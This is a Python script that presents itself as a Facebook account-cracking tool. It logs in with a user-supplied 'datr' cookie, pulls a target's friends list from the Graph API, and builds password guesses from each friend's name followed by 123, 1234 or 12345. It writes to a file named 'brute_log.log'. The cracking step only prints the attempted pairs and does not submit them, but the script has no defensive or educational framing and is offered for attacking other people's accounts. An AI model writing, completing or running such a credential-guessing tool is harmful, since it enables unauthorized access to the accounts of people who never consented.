import requests
from collections import deque
import logging
from rich.console import Console
from rich.table import Table

logging.basicConfig(filename="brute_log.log", level=logging.INFO)

console = Console()
credentials = deque()

class User:
    def __init__(self, id, name):
        self.id = id
        self.name = name.lower()

def get_friends_list(cookies, user_id):
    try:
        url = f"https://graph.facebook.com/{user_id}/friends"
        session = requests.Session()
        session.cookies.update(cookies)
        response = session.get(url, cookies=cookies)
        data = response.json().get('data', [])
        console.log(f"Fetched {len(data)} friends.")
        return [User(i['id'], i['name']) for i in data]
    except requests.exceptions.RequestException as e:
        console.log(f"Error: {e}")
        return []

def display_menu():
    console.print("\n[bold cyan]Select an option:[/bold cyan]")
    console.print("[bold white]1. Login through Facebook Cookie[/bold white]")
    console.print("[bold white]2. Fetch and Crack Friend's Public Profile[/bold white]")
    console.print("[bold white]3. Exit[/bold white]")

def login(cookies):
    user_id = input("Enter your Facebook User ID: ")
    friends = get_friends_list(cookies, user_id)
    return friends, cookies

def crack_public_profile(friends):
    if friends is not None:
        for friend in friends:
            username_list = [friend.name]
            for p_word_suffix in [123, 1234, 12345]:
                print("Attempting: (username: {0}, password: {0} + {1})".format(friend.name, str(p_word_suffix)))

def main():
    friends = None
    cookies = None
    while True:
        display_menu()
        choice = input("[bold cyan]Enter your choice:[/bold cyan] ")
        
        if choice == "1":
            if cookies is None:
                datr_cookie = input("Enter Facebook Datr Cookie: ")
                cookies = {"datr": datr_cookie}
                friends, cookies = login(cookies)
        elif choice == "2":
            if cookies is not None:
                user_id = input("Enter Facebook UserID to get friend list and crack profiles: ")
                friends = get_friends_list(cookies, user_id)
                crack_public_profile(friends)
            else:
                console.log("You are not logged in yet!")
        elif choice == "3":
            break
        else:
            console.log("Invalid choice. Please select a valid option.")

if __name__ == "__main__":
    main()
